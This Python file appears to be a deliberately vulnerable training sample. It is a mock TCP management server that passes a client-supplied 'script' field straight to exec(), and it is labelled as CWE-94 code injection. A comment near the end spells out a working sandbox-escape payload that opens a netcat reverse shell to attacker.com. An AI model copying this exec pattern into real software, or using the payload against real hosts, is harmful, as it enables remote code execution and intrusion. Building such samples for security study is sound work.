import os
import json
import time
import logging
import threading
import socketserver
from datetime import datetime

# Configure logging for the Legacy TCP Management Console
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - SysManagementTCP - %(levelname)s - %(message)s'
)
logger = logging.getLogger("TCPConsole")

# Mock System State Database
SYSTEM_STATE = {
    "cpu_usage": 45.2,
    "memory_usage": 1024 * 8,
    "disk_space": 1024 * 500,
    "active_users": ["admin", "sysop", "guest"],
    "uptime_seconds": 360000,
    "services": {
        "apache": "running",
        "mysql": "running",
        "postfix": "stopped"
    }
}

class SystemMetricsHistory:
    """Stores historical metrics for diagnostics."""
    def __init__(self):
        self.history = []
        self.lock = threading.Lock()

    def record_metrics(self):
        with self.lock:
            self.history.append({
                "timestamp": datetime.now().isoformat(),
                "cpu": SYSTEM_STATE["cpu_usage"],
                "mem": SYSTEM_STATE["memory_usage"]
            })
            if len(self.history) > 100:
                self.history.pop(0)

    def get_history(self):
        with self.lock:
            return list(self.history)

metrics_db = SystemMetricsHistory()

def run_background_monitor():
    """Simulates a background thread recording system metrics periodically."""
    while True:
        metrics_db.record_metrics()
        time.sleep(60)

def execute_diagnostic_routine(diagnostic_script: str) -> dict:
    """
    VULNERABLE FUNCTION: CWE-94 Improper Control of Generation of Code ('Code Injection')
    Trigger Path: Raw TCP Socket Payload -> 'script' value evaluated via exec()
    """
    logger.info("Executing custom diagnostic routine from remote client.")
    
    # We provide a local context containing the system state and history
    diagnostic_context = {
        "state": SYSTEM_STATE,
        "history": metrics_db.get_history(),
        "report": {}
    }
    
    try:
        # Vulnerability: The management console allows senior sysadmins to send 
        # custom Python scripts over the raw TCP connection to dynamically extract 
        # or calculate system metrics (e.g., aggregating memory usage over time).
        # The application directly executes this untrusted string as Python code.
        # An attacker who can reach this exposed TCP port can send a JSON payload 
        # containing malicious Python code. The exec() function runs this code 
        # in the server's process, leading to complete Remote Code Execution (RCE) 
        # on the host system.
        
        # CWE-94 occurs instantly when the untrusted diagnostic_script is executed.
        exec(diagnostic_script, {"__builtins__": {}}, diagnostic_context)
        
        # The script is expected to populate the 'report' dictionary
        result = diagnostic_context.get("report", {"error": "Report empty"})
        
        logger.info("Diagnostic routine completed successfully.")
        return {"status": "success", "data": result}
        
    except Exception as e:
        logger.error(f"Failed to execute diagnostic routine: {e}")
        return {"status": "error", "message": f"Diagnostic execution failed: {str(e)}"}

class ManagementTCPHandler(socketserver.BaseRequestHandler):
    """
    The request handler class for our TCP server.
    It is instantiated once per connection to the server.
    """
    def handle(self):
        client_ip = self.client_address[0]
        logger.info(f"Incoming connection accepted from {client_ip}")
        
        try:
            self.request.sendall(b"Welcome to the Legacy System Management Console.\n")
            self.request.sendall(b"Awaiting JSON commands...\n")
            
            data = self.request.recv(4096).strip()
            if not data:
                return
                
            payload_str = data.decode('utf-8')
            logger.debug(f"Received payload from {client_ip}: {payload_str}")
            
            try:
                command = json.loads(payload_str)
            except json.JSONDecodeError:
                self.request.sendall(b'{"status": "error", "message": "Invalid JSON payload"}\n')
                return

            action = command.get("action")
            
            if action == "ping":
                self.request.sendall(b'{"status": "success", "message": "pong"}\n')
                
            elif action == "get_state":
                response = json.dumps({"status": "success", "data": SYSTEM_STATE}) + "\n"
                self.request.sendall(response.encode('utf-8'))
                
            elif action == "run_diagnostic":
                script = command.get("script")
                if not script:
                    self.request.sendall(b'{"status": "error", "message": "Missing script parameter"}\n')
                    return
                    
                # Pass the untrusted string directly to the vulnerable function
                result = execute_diagnostic_routine(script)
                
                response = json.dumps(result) + "\n"
                self.request.sendall(response.encode('utf-8'))
                
            else:
                self.request.sendall(b'{"status": "error", "message": "Unknown action"}\n')
                
        except ConnectionResetError:
            logger.warning(f"Connection dropped by {client_ip}")
        except Exception as e:
            logger.error(f"Error handling request from {client_ip}: {e}")
            
        finally:
            logger.info(f"Connection closed for {client_ip}")

if __name__ == "__main__":
    monitor_thread = threading.Thread(target=run_background_monitor, daemon=True)
    monitor_thread.start()
    
    HOST, PORT = "0.0.0.0", 8888
    
    # Example Malicious Trigger:
    # 1. Attacker connects to the exposed management port using netcat or telnet:
    #    nc 127.0.0.1 8888
    # 2. Attacker sends a crafted JSON payload containing a malicious script:
    #    {"action": "run_diagnostic", "script": "[c for c in ().__class__.__base__.__subclasses__() if c.__name__ == 'catch_warnings'][0]()._module.__builtins__['__import__']('os').system('nc -e /bin/sh attacker.com 4444')"}
    # 3. The socket handler decodes the JSON and passes the string to exec(), granting RCE.
    
    logger.info(f"Starting Legacy TCP Management Server on {HOST}:{PORT}")
    try:
        with socketserver.ThreadingTCPServer((HOST, PORT), ManagementTCPHandler) as server:
            server.serve_forever()
    except KeyboardInterrupt:
        logger.info("Shutting down management server...")
